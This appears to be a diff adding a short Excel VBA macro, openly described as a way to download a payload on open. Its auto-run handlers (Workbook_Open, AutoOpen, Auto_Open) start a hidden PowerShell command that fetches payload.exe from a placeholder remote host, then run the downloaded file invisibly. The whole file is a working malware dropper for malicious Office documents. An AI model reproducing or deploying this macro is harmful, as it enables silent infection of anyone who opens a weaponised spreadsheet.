@@ -1,0 +1,31 @@
+\\Simple Excel Macro to download payload on open. 
+
+
+Sub Workbook_Open()
+    MyMacro
+End Sub
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub Auto_Open()
+    MyMacro
+End Sub
+Sub MyMacro()
+    Dim str As String
+    str = "powershell (New-Object System.Net.WebClient.DownloadFile('http://x.x.x.x/payload.exe', 'payload.exe')"
+    Shell str, vbHide
+    Dim exePath As String
+    exePath = ActiveWorkbook.Path + "\payload.exe"
+    Wait (2)
+    Shell exePath, vbHide
+End Sub
+
+
+Sub Wait(n As Long)
+    Dim t As Date
+    t = Now
+    Do
+        DoEvents
+        Loop Until Now >= DateAdd("s", n, t)
+End Sub
